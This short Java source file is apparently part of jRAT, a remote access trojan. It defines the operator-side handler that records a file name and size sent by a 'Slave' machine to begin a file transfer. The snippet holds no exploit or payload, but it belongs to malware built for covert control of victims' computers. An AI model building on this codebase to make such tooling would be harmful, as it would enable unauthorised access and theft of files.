package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;


public class Packet30BeginServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String file = slave.readLine();
		long length = dis.readLong();
		
		TransferData data = FileCache.get(slave);

		if (data != null) {
			data.remote = file;
			data.total = length;
		}
	}

}
